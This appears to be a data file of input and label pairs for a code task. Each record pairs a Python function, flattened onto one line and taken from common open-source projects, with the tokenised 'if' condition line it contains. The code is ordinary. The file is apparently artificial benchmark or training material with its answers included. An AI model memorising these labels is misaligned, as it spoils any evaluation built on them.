{"input": "def receive(debug=debug): if should_shutdown and should_shutdown(): debug(\"worker got sentinel -- exiting\") raise SystemExit(EX_OK) try: ready, req = _receive(1.0) if not ready: return None except (EOFError, IOError) as exc: if get_errno(exc) == errno.EINTR: return None # interrupted, maybe by gdb debug(\"worker got %s -- exiting\", type(exc).__name__) raise SystemExit(EX_FAILURE) if req is None: debug(\"worker got sentinel -- exiting\") raise SystemExit(EX_FAILURE) return req", "label": "if not ready :"}
{"input": "def test_all(self): raw = [r for r in self.map._revision_map.values() if r is not None] revs = [rev for rev in self.map.iterate_revisions(\"heads\", \"base\")] eq_(set(raw), set(revs)) for idx, rev in enumerate(revs): ancestors = set(self.map._get_ancestor_nodes([rev])).difference([rev]) descendants = set(self.map._get_descendant_nodes([rev])).difference([rev]) assert not ancestors.intersection(descendants) remaining = set(revs[idx + 1 :]) if remaining: assert remaining.intersection(ancestors)", "label": "if remaining :"}
{"input": "def is_issue(self, node): first = node.children[0] if first.type == \"string\" and self._normalizer.version >= (3, 0): first_is_bytes = self._is_bytes_literal(first) for string in node.children[1:]: if first_is_bytes != self._is_bytes_literal(string): return True", "label": "if first_is_bytes != self . _is_bytes_literal ( string ) :"}
{"input": "def elements(registry): \"\"\"Given a resource registry return sorted de-aliased values.\"\"\" seen = {} for k, v in registry.items(): if k in (\"and\", \"or\", \"not\"): continue if v in seen: continue else: seen[ElementSchema.name(v)] = v return [seen[k] for k in sorted(seen)]", "label": "if k in ( \"and\" , \"or\" , \"not\" ) :"}
{"input": "def make_pattern(wtree): subpattern = [] for part in wtree[1:-1]: if isinstance(part, list): part = make_pattern(part) elif wtree[0] != \"\": for c in part: # Meta-characters cannot be quoted if c in special_chars: raise GlobError() subpattern.append(part) return \"\".join(subpattern)", "label": "if c in special_chars :"}
{"input": "def check_if_list_contain_duplicates(item: list, depth: int) -> None: try: if len(item) != len(set(item)): print(Fore.RED + \"Rule {} has duplicate filters\".format(file)) files_with_duplicate_filters.append(file) except: # unhashable types like dictionaries for sub_item in item: if type(sub_item) == dict and depth <= MAX_DEPTH: check_list_or_recurse_on_dict(sub_item, depth + 1)", "label": "if type ( sub_item ) == dict and depth <= MAX_DEPTH :"}
{"input": "def PrintHighlighted(self, out): from doctools import make_help pos = self.start_pos for line_end in Lines(self.s, self.start_pos, self.end_pos): # NOTE: HighlightLine accepts an HTML ESCAPED line. It's valid to just # add tags and leave everything alone. line = self.s[pos:line_end] html_line = make_help.HighlightLine(self.lang, line) if html_line is not None: out.PrintUntil(pos) out.Print(html_line) out.SkipTo(line_end) pos = line_end", "label": "if html_line is not None :"}
{"input": "def closeEvent(self, e=None): \"\"\"Save settings and remove registered logging handler\"\"\" if self.editor.isModified(): # ask if user wants to save if self.wants_save(): if self.save(): e.accept() else: # saving error or user canceled e.ignore() else: # discard changes e.accept() else: # unchanged e.accept()", "label": "if self . wants_save ( ) :"}
{"input": "def readlines(self, hint=None): if self.chunked_input: lines = [] for line in iter(self.readline, b\"\"): lines.append(line) if hint and hint > 0: hint -= len(line) if hint <= 0: break return lines else: return self._do_read(self.rfile.readlines, hint)", "label": "if hint <= 0 :"}
{"input": "def test_prod(self): with gpytorch.settings.fast_computations(covar_root_decomposition=False): lazy_tensor = self.create_lazy_tensor() evaluated = self.evaluate_lazy_tensor(lazy_tensor) if lazy_tensor.ndimension() > 2: self.assertAllClose( lazy_tensor.prod(-3).evaluate(), evaluated.prod(-3), **self.tolerances[\"prod\"] ) if lazy_tensor.ndimension() > 3: self.assertAllClose( lazy_tensor.prod(-4).evaluate(), evaluated.prod(-4), **self.tolerances[\"prod\"] )", "label": "if lazy_tensor . ndimension ( ) > 2 :"}
{"input": "def make_module_translation_map(names: List[str]) -> Dict[str, str]: num_instances = {} # type: Dict[str, int] for name in names: for suffix in candidate_suffixes(name): num_instances[suffix] = num_instances.get(suffix, 0) + 1 result = {} for name in names: for suffix in candidate_suffixes(name): if num_instances[suffix] == 1: result[name] = suffix break else: assert False, names return result", "label": "if num_instances [ suffix ] == 1 :"}
{"input": "def output(self): \"\"\"Transform self into a list of (name, value) tuples.\"\"\" header_list = [] for k, v in self.items(): if isinstance(k, unicodestr): k = self.encode(k) if not isinstance(v, basestring): v = str(v) if isinstance(v, unicodestr): v = self.encode(v) # See header_translate_* constants above. # Replace only if you really know what you're doing. k = k.translate(header_translate_table, header_translate_deletechars) v = v.translate(header_translate_table, header_translate_deletechars) header_list.append((k, v)) return header_list", "label": "if not isinstance ( v , basestring ) :"}
{"input": "def get_errors(self, attacked_text, use_cache=False): text = attacked_text.text if use_cache: if text not in self.grammar_error_cache: self.grammar_error_cache[text] = len(self.lang_tool.check(text)) return self.grammar_error_cache[text] else: return len(self.lang_tool.check(text))", "label": "if text not in self . grammar_error_cache :"}
{"input": "def gen(): for _ in range(256): if seq: yield self.tb.dut.i.eq(seq.pop(0)) i = yield self.tb.dut.i if (yield self.tb.dut.n): self.assertEqual(i, 0) else: o = yield self.tb.dut.o if o > 0: self.assertEqual(i & 1 << (o - 1), 0) self.assertGreaterEqual(i, 1 << o) yield", "label": "if ( yield self . tb . dut . n ) :"}
{"input": "def _register_builtin_handlers(self, events): for spec in handlers.BUILTIN_HANDLERS: if len(spec) == 2: event_name, handler = spec self.register(event_name, handler) else: event_name, handler, register_type = spec if register_type is handlers.REGISTER_FIRST: self._events.register_first(event_name, handler) elif register_type is handlers.REGISTER_LAST: self._events.register_last(event_name, handler)", "label": "if len ( spec ) == 2 :"}
{"input": "def is_checked_sls_template(template): if template.__contains__(\"provider\"): # Case provider is a dictionary if isinstance(template[\"provider\"], dict_node): if template[\"provider\"].get(\"name\").lower() not in SUPPORTED_PROVIDERS: return False # Case provider is direct provider name if isinstance(template[\"provider\"], str_node): if template[\"provider\"] not in SUPPORTED_PROVIDERS: return False return True return False", "label": "if isinstance ( template [ \"provider\" ] , dict_node ) :"}
{"input": "def decode_body(self, response): if response is None: return response if six.PY2: return response if response.body: # Decode it if response.headers.get(\"Content-Type\") == \"application/json\": response._body = response.body.decode(\"utf-8\") else: response._body = salt.ext.tornado.escape.native_str(response.body) return response", "label": "if response . headers . get ( \"Content-Type\" ) == \"application/json\" :"}
{"input": "def get_active_project_path(): window = sublime.active_window() folders = window.folders() if len(folders) == 1: return folders[0] else: active_view = window.active_view() active_file_name = active_view.file_name() if active_view else None if not active_file_name: return folders[0] if len(folders) else os.path.expanduser(\"~\") for folder in folders: if active_file_name.startswith(folder): return folder return os.path.dirname(active_file_name)", "label": "if active_file_name . startswith ( folder ) :"}
{"input": "def pop(self, *a): lists = self.lists if len(lists) == 1 and not a: return self.lists[0].pop() index = a and a[0] if index == () or index is None or index == -1: ret = lists[-1].pop() if len(lists) > 1 and not lists[-1]: lists.pop() else: list_idx, rel_idx = self._translate_index(index) if list_idx is None: raise IndexError() ret = lists[list_idx].pop(rel_idx) self._balance_list(list_idx) return ret", "label": "if list_idx is None :"}
{"input": "def setup(self, gen): Node.setup(self, gen) try: self.target = gen.rules[self.name] if self.accepts_epsilon != self.target.accepts_epsilon: self.accepts_epsilon = self.target.accepts_epsilon gen.changed() except KeyError: # Oops, it's nonexistent print >>sys.stderr, \"Error: no rule <%s>\" % self.name self.target = self", "label": "if self . accepts_epsilon != self . target . accepts_epsilon :"}
{"input": "def match(self, userargs): # Early skip if command or number of args don't match if len(self.args) != len(userargs): # DENY: argument numbers don't match return False # Compare each arg (anchoring pattern explicitly at end of string) for (pattern, arg) in zip(self.args, userargs): try: if not re.match(pattern + \"$\", arg): break except re.error: # DENY: Badly-formed filter return False else: # ALLOW: All arguments matched return True # DENY: Some arguments did not match return False", "label": "if not re . match ( pattern + \"$\" , arg ) :"}
{"input": "def broadcast(self, msg, eid): for s in self.subs: if type(self.subs[s].eid) is list: if eid in self.subs[s].eid: self.subs[s].write_message(msg) else: if self.subs[s].eid == eid: self.subs[s].write_message(msg)", "label": "if self . subs [ s ] . eid == eid :"}
{"input": "def apply_transformation(self, ti: TransformationInput) -> Transformation: fragments = ti.fragments # Walk through all te fragments. if fragments and fragment_list_to_text(fragments).startswith(\" \"): t = (self.style, self.get_char()) fragments = explode_text_fragments(fragments) for i in range(len(fragments)): if fragments[i][1] == \" \": fragments[i] = t else: break return Transformation(fragments)", "label": "if fragments [ i ] [ 1 ] == \" \" :"}
{"input": "def _url_encode_impl(obj, charset, encode_keys, sort, key): iterable = sdict() for key, values in obj.items(): if not isinstance(values, list): values = [values] iterable[key] = values if sort: iterable = sorted(iterable, key=key) for key, values in iterable.items(): for value in values: if value is None: continue if not isinstance(key, bytes): key = str(key).encode(charset) if not isinstance(value, bytes): value = str(value).encode(charset) yield url_quote_plus(key) + \"=\" + url_quote_plus(value)", "label": "if not isinstance ( values , list ) :"}
{"input": "def get_objects(self) -> Iterator[Tuple[str, str, str, str, str, int]]: rootSymbol = self.data[\"root_symbol\"] for symbol in rootSymbol.get_all_symbols(): if symbol.declaration is None: continue assert symbol.docname fullNestedName = symbol.get_full_nested_name() name = str(fullNestedName).lstrip(\".\") dispname = fullNestedName.get_display_string().lstrip(\".\") objectType = symbol.declaration.objectType docname = symbol.docname newestId = symbol.declaration.get_newest_id() yield (name, dispname, objectType, docname, newestId, 1)", "label": "if symbol . declaration is None :"}
{"input": "def _delete_duplicates(l, keep_last): \"\"\"Delete duplicates from a sequence, keeping the first or last.\"\"\" seen = {} result = [] if keep_last: # reverse in & out, then keep first l.reverse() for i in l: try: if i not in seen: result.append(i) seen[i] = 1 except TypeError: # probably unhashable. Just keep it. result.append(i) if keep_last: result.reverse() return result", "label": "if i not in seen :"}
{"input": "def combine_logs(audit_logs, statement_text_logs): for audit_transaction in audit_logs: for audit_query in audit_logs[audit_transaction]: matching_statement_text_logs = statement_text_logs.get(hash(audit_query)) if matching_statement_text_logs: statement_text_log = matching_statement_text_logs.pop() if statement_text_log: if statement_text_log.start_time: audit_query.start_time = statement_text_log.start_time if statement_text_log.end_time: audit_query.end_time = statement_text_log.end_time", "label": "if matching_statement_text_logs :"}
{"input": "def free(self, addr, ban=0): with self.lock: if ban != 0: self.ban.append({\"addr\": addr, \"counter\": ban}) else: base, bit, is_allocated = self.locate(addr) if len(self.addr_map) <= base: raise KeyError(\"address is not allocated\") if self.addr_map[base] & (1 << bit): raise KeyError(\"address is not allocated\") self.allocated -= 1 self.addr_map[base] ^= 1 << bit", "label": "if self . addr_map [ base ] & ( 1 << bit ) :"}
{"input": "def _assertParseMethod(test, code_str, method, expect_success=True): arena, c_parser = InitCommandParser(code_str) m = getattr(c_parser, method) node = m() if node: ast_lib.PrettyPrint(node) if not expect_success: test.fail(\"Expected %r to fail \" % code_str) else: # TODO: Could copy PrettyPrintError from pysh.py err = c_parser.Error() print(err) ui.PrintErrorStack(err, arena, sys.stdout) if expect_success: test.fail(\"%r failed\" % code_str) return node", "label": "if expect_success :"}
{"input": "def _gen(): while True: try: loop_val = it.next() # e.g. x except StopIteration: break self.mem.SetValue( lvalue.Named(iter_name), value.Obj(loop_val), scope_e.LocalOnly ) if comp.cond: b = self.EvalExpr(comp.cond) else: b = True if b: item = self.EvalExpr(node.elt) # e.g. x*2 yield item", "label": "if comp . cond :"}
{"input": "def _build_default_obj_recursive(self, _properties, res): \"\"\"takes disparate and nested default keys, and builds up a default object\"\"\" for key, prop in _properties.items(): if \"default\" in prop and key not in res: res[key] = copy(prop[\"default\"]) elif prop.get(\"type\") == \"object\" and \"properties\" in prop: res.setdefault(key, {}) res[key] = self._build_default_obj_recursive(prop[\"properties\"], res[key]) return res", "label": "if \"default\" in prop and key not in res :"}
{"input": "def mean(self): \"\"\"Compute the mean of the value_field in the window.\"\"\" if len(self.data) > 0: datasum = 0 datalen = 0 for dat in self.data: if \"placeholder\" not in dat[0]: datasum += dat[1] datalen += 1 if datalen > 0: return datasum / float(datalen) return None else: return None", "label": "if \"placeholder\" not in dat [ 0 ] :"}
{"input": "def addNames(self, import_names, node_names): for names in node_names: if isinstance(names, basestring): name = names elif names[1] is None: name = names[0] else: name = names[1] import_names[name] = True", "label": "if isinstance ( names , basestring ) :"}
{"input": "def set(sensor_spec: dict, **kwargs): for key, value in kwargs.items(): if key == \"position\": sensor_spec[\"transform\"] = SensorSpecs.get_position(value) elif key == \"attachment_type\": sensor_spec[key] = SensorSpecs.ATTACHMENT_TYPE[value] elif key == \"color_converter\": sensor_spec[key] = SensorSpecs.COLOR_CONVERTER[value]", "label": "if key == \"position\" :"}
{"input": "def delete_session(self): cookie = self.headers.get(HTTP_HEADER.COOKIE) if cookie: match = re.search(r\"%s=(.+)\" % SESSION_COOKIE_NAME, cookie) if match: session = match.group(1) if session in SESSIONS: del SESSIONS[session]", "label": "if session in SESSIONS :"}
{"input": "def rename_var(block: paddle.device.framework.Block, old_name: str, new_name: str): \"\"\" \"\"\" for op in block.ops: for input_name in op.input_arg_names: if input_name == old_name: op._rename_input(old_name, new_name) for output_name in op.output_arg_names: if output_name == old_name: op._rename_output(old_name, new_name) block._rename_var(old_name, new_name)", "label": "if input_name == old_name :"}
{"input": "def updateParticle(part, best, phi1, phi2): u1 = numpy.random.uniform(0, phi1, len(part)) u2 = numpy.random.uniform(0, phi2, len(part)) v_u1 = u1 * (part.best - part) v_u2 = u2 * (best - part) part.speed += v_u1 + v_u2 for i, speed in enumerate(part.speed): if abs(speed) < part.smin: part.speed[i] = math.copysign(part.smin, speed) elif abs(speed) > part.smax: part.speed[i] = math.copysign(part.smax, speed) part += part.speed", "label": "if abs ( speed ) < part . smin :"}
{"input": "def acquire(self, blocking=True, timeout=None): if not blocking and timeout is not None: raise ValueError(\"can't specify timeout for non-blocking acquire\") rc = False endtime = None self._cond.acquire() while self._value == 0: if not blocking: break if timeout is not None: if endtime is None: endtime = _time() + timeout else: timeout = endtime - _time() if timeout <= 0: break self._cond.wait(timeout) else: self._value = self._value - 1 rc = True self._cond.release() return rc", "label": "if timeout is not None :"}
{"input": "def test_ESPnetDataset_text_float(text_float): dataset = IterableESPnetDataset( path_name_type_list=[(text_float, \"data8\", \"text_float\")], preprocess=preprocess, ) for key, data in dataset: if key == \"a\": assert all((data[\"data8\"]) == np.array([1.4, 3.4], dtype=np.float32)) if key == \"b\": assert all((data[\"data8\"]) == np.array([0.9, 9.3], dtype=np.float32))", "label": "if key == \"a\" :"}
{"input": "def __eq__(self, other): if isinstance(other, OrderedDict): if len(self) != len(other): return False for p, q in zip(list(self.items()), list(other.items())): if p != q: return False return True return dict.__eq__(self, other)", "label": "if len ( self ) != len ( other ) :"}
{"input": "def exec_command(command, cwd=None, stdout=None, env=None): \"\"\"Returns True in the command was executed successfully\"\"\" try: command_list = command if isinstance(command, list) else command.split() env_vars = os.environ.copy() if env: env_vars.update(env) subprocess.check_call(command_list, stdout=stdout, cwd=cwd, env=env_vars) return True except subprocess.CalledProcessError as err: print(err, file=sys.stderr) return False", "label": "if env :"}
{"input": "def _get_lun_details(self, lun_id): \"\"\"Given the ID of a LUN, get the details about that LUN\"\"\" server = self.client.service res = server.LunListInfoIterStart(ObjectNameOrId=lun_id) tag = res.Tag try: res = server.LunListInfoIterNext(Tag=tag, Maximum=1) if hasattr(res, \"Luns\") and res.Luns.LunInfo: return res.Luns.LunInfo[0] finally: server.LunListInfoIterEnd(Tag=tag)", "label": "if hasattr ( res , \"Luns\" ) and res . Luns . LunInfo :"}
{"input": "def _process_events(self, event_list): for key, mask in event_list: fileobj, (reader, writer) = key.fileobj, key.data if mask & selectors.EVENT_READ and reader is not None: if reader._cancelled: self.remove_reader(fileobj) else: self._add_callback(reader) if mask & selectors.EVENT_WRITE and writer is not None: if writer._cancelled: self.remove_writer(fileobj) else: self._add_callback(writer)", "label": "if mask & selectors . EVENT_WRITE and writer is not None :"}
{"input": "def process_doc(self, docstrings: List[List[str]]) -> Iterator[str]: \"\"\"Let the user process the docstrings before adding them.\"\"\" for docstringlines in docstrings: if self.env.app: # let extensions preprocess docstrings self.env.app.emit( \"autodoc-process-docstring\", self.objtype, self.fullname, self.object, self.options, docstringlines, ) if docstringlines and docstringlines[-1] != \"\": # append a blank line to the end of the docstring docstringlines.append(\"\") yield from docstringlines", "label": "if docstringlines and docstringlines [ - 1 ] != \"\" :"}
{"input": "def vectorize(self, doc, vocab, char_vocab): words = np.asarray( [vocab[w.lower()] if w.lower() in vocab else 1 for w in doc] ).reshape(1, -1) sentence_chars = [] for w in doc: word_chars = [] for c in w: if c in char_vocab: _cid = char_vocab[c] else: _cid = 1 word_chars.append(_cid) sentence_chars.append(word_chars) sentence_chars = np.expand_dims( pad_sentences(sentence_chars, self.model.word_length), axis=0 ) return words, sentence_chars", "label": "if c in char_vocab :"}
{"input": "def runtestenv(venv, config, redirect=False): if venv.status == 0 and config.option.notest: venv.status = \"skipped tests\" else: if venv.status: return config.pluginmanager.hook.tox_runtest_pre(venv=venv) if venv.status == 0: config.pluginmanager.hook.tox_runtest(venv=venv, redirect=redirect) config.pluginmanager.hook.tox_runtest_post(venv=venv)", "label": "if venv . status :"}
{"input": "def _import_config_module(self, name): try: self.find_module(name) except NotAPackage: if name.endswith(\".py\"): reraise( NotAPackage, NotAPackage(CONFIG_WITH_SUFFIX.format(module=name, suggest=name[:-3])), sys.exc_info()[2], ) reraise( NotAPackage, NotAPackage(CONFIG_INVALID_NAME.format(module=name)), sys.exc_info()[2], ) else: return self.import_from_cwd(name)", "label": "if name . endswith ( \".py\" ) :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 8: self.set_format(d.getVarInt32()) continue if tt == 18: self.set_path(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 8 :"}
{"input": "def get(self, request, *args, **kwargs): # Generate sidebar forms self.sidebar_forms = [] for form_id, (plugin, Form) in self.get_sidebar_form_classes().items(): if Form: form = Form(self.article, self.request.user) setattr(form, \"form_id\", form_id) else: form = None self.sidebar.append((plugin, form)) return super().get(request, *args, **kwargs)", "label": "if Form :"}
{"input": "def check_click(self): if not isinstance(self, SwiDebugView): return cursor = self.sel()[0].a index = 0 click_regions = self.get_regions(\"swi_log_clicks\") for callback in click_regions: if cursor > callback.a and cursor < callback.b: if index < len(self.callbacks): callback = self.callbacks[index] callback[\"callback\"](*callback[\"args\"]) index += 1", "label": "if index < len ( self . callbacks ) :"}
{"input": "def get_sock(port): sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) while True: try: _port = port or random.randint(1025, 5000) print((\"try bind local port:\", _port)) sock.bind((\"0.0.0.0\", _port)) return sock except socket.error as e: if port: print((\"bind local port %d fail: %r\" % (_port, e))) return if e.args[0] == errno.EADDRINUSE: pass", "label": "if port :"}
{"input": "def ParsePlacemark(self, node): ret = Placemark() for child in node.childNodes: if child.nodeName == \"name\": ret.name = self.ExtractText(child) if child.nodeName == \"Point\" or child.nodeName == \"LineString\": ret.coordinates = self.ExtractCoordinates(child) return ret", "label": "if child . nodeName == \"Point\" or child . nodeName == \"LineString\" :"}
{"input": "def _load_library(self): if self.library is not None: if isinstance(self.library, (tuple, list)): name, mod_path = self.library else: name = mod_path = self.library try: module = importlib.import_module(mod_path) except ImportError: raise ValueError(\"Couldn't load %s password algorithm \" \"library\" % name) return module raise ValueError(\"Hasher '%s' doesn't specify a library attribute\" % self.__class__)", "label": "if isinstance ( self . library , ( tuple , list ) ) :"}
{"input": "def check(self): for r in self.results: if r.backend: assert r.backend.name == self.target.path.k8s, ( r.backend.name, self.target.path.k8s, ) assert r.backend.request.headers[\"x-envoy-original-path\"][0] in ( f\"/{self.name}/\", f\"/{self.name}-nested/\", )", "label": "if r . backend :"}
{"input": "def eval(self, code, eval=True, raw=False): self._engine._append_source(code) try: result = self._context.eval(code) except quickjs.JSException as e: raise ProgramError(*e.args) else: if eval: if raw or not isinstance(result, quickjs.Object): return result elif callable(result) and self.typeof(result) == u\"function\": return self.Function(self, result) else: return json.loads(result.json())", "label": "elif callable ( result ) and self . typeof ( result ) == u\"function\" :"}
{"input": "def __truediv__(self, val): if isinstance(val, Vector3): if val.x == 0 or val.y == 0 or val.z == 0: raise ZeroDivisionError() gd_obj = lib.godot_vector3_operator_divide_vector(self._gd_ptr, val._gd_ptr) else: if val is 0: raise ZeroDivisionError() gd_obj = lib.godot_vector3_operator_divide_scalar(self._gd_ptr, val) return Vector3.build_from_gdobj(gd_obj)", "label": "if val . x == 0 or val . y == 0 or val . z == 0 :"}
{"input": "def set_peek(self, dataset, is_multi_byte=False): if not dataset.dataset.purged: dataset.peek = data.get_file_peek(dataset.file_name) if dataset.metadata.sequences: dataset.blurb = \"%s sequences\" % util.commaify( str(dataset.metadata.sequences) ) else: dataset.blurb = nice_size(dataset.get_size()) else: dataset.peek = \"file does not exist\" dataset.blurb = \"file purged from disk\"", "label": "if dataset . metadata . sequences :"}
{"input": "def _get_plugin_src_dirs(base_dir): plug_in_base_path = Path(get_src_dir(), base_dir) plugin_dirs = get_dirs_in_dir(str(plug_in_base_path)) plugins = [] for plugin_path in plugin_dirs: plugin_code_dir = Path(plugin_path, \"code\") if plugin_code_dir.is_dir(): plugins.append(str(plugin_code_dir)) else: logging.warning(\"Plugin has no code directory: {}\".format(plugin_path)) return plugins", "label": "if plugin_code_dir . is_dir ( ) :"}
{"input": "def _format_privilege_data(self, data): for key in [\"spcacl\"]: if key in data and data[key] is not None: if \"added\" in data[key]: data[key][\"added\"] = parse_priv_to_db(data[key][\"added\"], self.acl) if \"changed\" in data[key]: data[key][\"changed\"] = parse_priv_to_db(data[key][\"changed\"], self.acl) if \"deleted\" in data[key]: data[key][\"deleted\"] = parse_priv_to_db(data[key][\"deleted\"], self.acl)", "label": "if \"deleted\" in data [ key ] :"}
{"input": "def __init__(self, methodName=\"runTest\"): unittest.TestCase.__init__(self, methodName) # We expect files to be relative to this test script. test_dir = dirname(dirname(__file__)) self._dir = normpath(join(test_dir, \"stuff/charsets/www.kostis.net/charsets\")) self._enc = {} # get all the utf-8 files in this dir, and well recode them names = os.listdir(self._dir) for name in names: if not os.path.isfile(os.path.join(self._dir, name)): continue enc = name.split(\".\")[0] if decoderAvailable(enc): self._enc[enc] = name", "label": "if not os . path . isfile ( os . path . join ( self . _dir , name ) ) :"}
{"input": "def get_actions_on_list(self, actions, modelview_name): res_actions = dict() for action_key in actions: action = actions[action_key] if self.is_item_visible(action.name, modelview_name) and action.multiple: res_actions[action_key] = action return res_actions", "label": "if self . is_item_visible ( action . name , modelview_name ) and action . multiple :"}
{"input": "def triger_check_network(self, fail=False, force=False): time_now = time.time() if not force: if self._checking_num > 0: return if fail or self.network_stat != \"OK\": # Fail or unknown if time_now - self.last_check_time < 3: return else: if time_now - self.last_check_time < 10: return self.last_check_time = time_now threading.Thread(target=self._simple_check_worker).start()", "label": "if time_now - self . last_check_time < 3 :"}
{"input": "def write(self, root): \"\"\"Write all the *descendants* of an .dart node.\"\"\" root_level = root.level() for p in root.subtree(): indent = p.level() - root_level self.put(\"%s %s\" % (\"*\" * indent, p.h)) for s in p.b.splitlines(False): if not g.isDirective(s): self.put(s) root.setVisited() return True", "label": "if not g . isDirective ( s ) :"}
{"input": "def characters(self, ch): if self.Text_tag: if self.Summary_tag: self.Summary_ch += ch elif self.Attack_Prerequisite_tag: self.Attack_Prerequisite_ch += ch elif self.Solution_or_Mitigation_tag: self.Solution_or_Mitigation_ch += ch elif self.CWE_ID_tag: self.CWE_ID_ch += ch", "label": "if self . Summary_tag :"}
{"input": "def _handle_function(self, addr): if self.arch.name == \"X86\": try: b = self._project.loader.memory.load(addr, 4) except KeyError: return except TypeError: return if b == b\"\\x8b\\x1c\\x24\\xc3\": # getpc: # mov ebx, [esp] # ret ebx_offset = self.arch.registers[\"ebx\"][0] self.state.store_register(ebx_offset, 4, self.block.addr + self.block.size)", "label": "if b == b\"\\x8b\\x1c\\x24\\xc3\" :"}
{"input": "def safe_makedir(dname): \"\"\"Make a directory if it doesn't exist, handling concurrent race conditions.\"\"\" if not dname: return dname num_tries = 0 max_tries = 5 while not os.path.exists(dname): # we could get an error here if multiple processes are creating # the directory at the same time. Grr, concurrency. try: os.makedirs(dname) except OSError: if num_tries > max_tries: raise num_tries += 1 time.sleep(2) return dname", "label": "if num_tries > max_tries :"}
{"input": "def _setup_data(self, path): with PathManager.open(path) as data_file: if \"extra\" in path and \"train\" in path: line = data_file.readline() # trim corrupted JSON line = line[: line.rfind(\"{\")] line = line[: line.rfind(\",\")] + \"]\" self.data = json.loads(line) else: self.data = json.load(data_file)", "label": "if \"extra\" in path and \"train\" in path :"}
{"input": "def _end_delimiter(state, token): py = state[\"pymode\"] s = token.string l, c = token.start if len(py) > 1: mode, orig, match, pos = py.pop() if s != match: e = '\"{}\" at {} ends \"{}\" at {} (expected \"{}\")' return e.format(s, (l, c), orig, pos, match) else: return 'Unmatched \"{}\" at line {}, column {}'.format(s, l, c)", "label": "if s != match :"}
{"input": "def onLeftDoubleClick(self, event): row, _ = self.HitTest(event.Position) if row != -1: col = self.getColumn(event.Position) if col != self.getColIndex(State): try: booster = self.boosters[row] except IndexError: return self.removeBoosters([booster])", "label": "if col != self . getColIndex ( State ) :"}
{"input": "def get_instance_userdata( version=\"latest\", sep=None, url=\"http://169.254.169.254\", timeout=None, num_retries=5, ): ud_url = _build_instance_metadata_url(url, version, \"user-data\") user_data = retry_url( ud_url, retry_on_404=False, num_retries=num_retries, timeout=timeout ) if user_data: if sep: l = user_data.split(sep) user_data = {} for nvpair in l: t = nvpair.split(\"=\") user_data[t[0].strip()] = t[1].strip() return user_data", "label": "if sep :"}
{"input": "def parts(self): klass = self.__class__ this = list() for token in self: if token.startswith_fws(): if this: yield this[0] if len(this) == 1 else klass(this) this.clear() end_ws = token.pop_trailing_ws() this.append(token) if end_ws: yield klass(this) this = [end_ws] if this: yield this[0] if len(this) == 1 else klass(this)", "label": "if this :"}
{"input": "def run(self): while True: self._trigger.wait() self._trigger.clear() if self._terminate: break for url in self.urls: logger.info(\"Pinging for problem update: %s\", url) try: with closing(urlopen(url, data=\"\")) as f: f.read() except Exception: logger.exception(\"Failed to ping for problem update: %s\", url)", "label": "if self . _terminate :"}
{"input": "def _get_trading_minutes(self, trading_date): trading_minutes = set() for account_type in self._config.base.accounts: if account_type == DEFAULT_ACCOUNT_TYPE.STOCK: trading_minutes = trading_minutes.union( self._get_stock_trading_minutes(trading_date) ) elif account_type == DEFAULT_ACCOUNT_TYPE.FUTURE: trading_minutes = trading_minutes.union( self._get_future_trading_minutes(trading_date) ) return sorted(list(trading_minutes))", "label": "elif account_type == DEFAULT_ACCOUNT_TYPE . FUTURE :"}
{"input": "def make_tree(self, node): if node is self.root: node.code = \"\" children = [] for bit in \"01\": next_code = node.code + bit if next_code in self.codes: child = Node(char=self.codes[next_code]) else: child = Node() child.code = next_code children.append(child) node.add(children) for child in children: if not child.is_leaf: self.make_tree(child)", "label": "if next_code in self . codes :"}
{"input": "def _merge(self, a, b, path=None): \"\"\"Merge two dictionaries, from http://stackoverflow.com/questions/7204805/dictionaries-of-dictionaries-merge\"\"\" if path is None: path = [] for key in b: if key in a: if isinstance(a[key], dict) and isinstance(b[key], dict): self._merge(a[key], b[key], path + [str(key)]) elif a[key] == b[key]: pass # same leaf value else: raise Exception(\"Conflict at %s\" % \".\".join(path + [str(key)])) else: a[key] = b[key] return a", "label": "if isinstance ( a [ key ] , dict ) and isinstance ( b [ key ] , dict ) :"}
{"input": "def _append_value(generator, val=None): for example in generator: example = list(example) if val is not None: for key, value in val.items(): example[key] = np.append(example[key], value, -1) yield tuple(example)", "label": "if val is not None :"}
{"input": "def run(self): to_delete = set() for k, v in iteritems(self.objs): if k.startswith(\"_\"): continue if v[\"_class\"] == \"SubmissionFormatElement\": to_delete.add(k) if v[\"_class\"] == \"Task\": v[\"submission_format\"] = list( self.objs[k][\"filename\"] for k in v.get(\"submission_format\", list()) ) for k in to_delete: del self.objs[k] return self.objs", "label": "if k . startswith ( \"_\" ) :"}
{"input": "def service_destroy(context, service_id): session = get_session() with session.begin(): service_ref = service_get(context, service_id, session=session) service_ref.delete(session=session) if service_ref.topic == \"compute\" and service_ref.compute_node: for c in service_ref.compute_node: c.delete(session=session)", "label": "if service_ref . topic == \"compute\" and service_ref . compute_node :"}
{"input": "def wiki(self, query): res = [] for entry in g.current_wiki.get_index(): name = filename_to_cname(entry[\"name\"]) name = re.sub(r\"//+\", \"/\", name) if set(query.split()).intersection(name.replace(\"/\", \"-\").split(\"-\")): page = g.current_wiki.get_page(name) # this can be None, not sure how if page: res.append(dict(name=name, content=page.data)) return res", "label": "if set ( query . split ( ) ) . intersection ( name . replace ( \"/\" , \"-\" ) . split ( \"-\" ) ) :"}
{"input": "def numericalize(self, arr, device=None): if isinstance(arr[0][0], list): tmp = [ super(BABI20Field, self).numericalize(x, device=device).data for x in arr ] arr = torch.stack(tmp) if self.sequential: arr = arr.contiguous() return arr else: return super(BABI20Field, self).numericalize(arr, device=device)", "label": "if self . sequential :"}
{"input": "def validate_and_handle(self): valid = self.validate(set_cursor=True) if valid: if self.accept_handler: keep_text = self.accept_handler(self) else: keep_text = False if not keep_text: self.reset()", "label": "if not keep_text :"}
{"input": "def headerData(self, section, orientation, role=Qt.DisplayRole): if role == Qt.TextAlignmentRole: if orientation == Qt.Horizontal: return to_qvariant(int(Qt.AlignHCenter | Qt.AlignVCenter)) return to_qvariant(int(Qt.AlignRight | Qt.AlignVCenter)) if role != Qt.DisplayRole: return to_qvariant() if orientation == Qt.Horizontal: if section == NAME: return to_qvariant(\"Name\") elif section == VERSION: return to_qvariant(\"Version\") elif section == ACTION: return to_qvariant(\"Action\") elif section == DESCRIPTION: return to_qvariant(\"Description\") return to_qvariant()", "label": "if section == NAME :"}
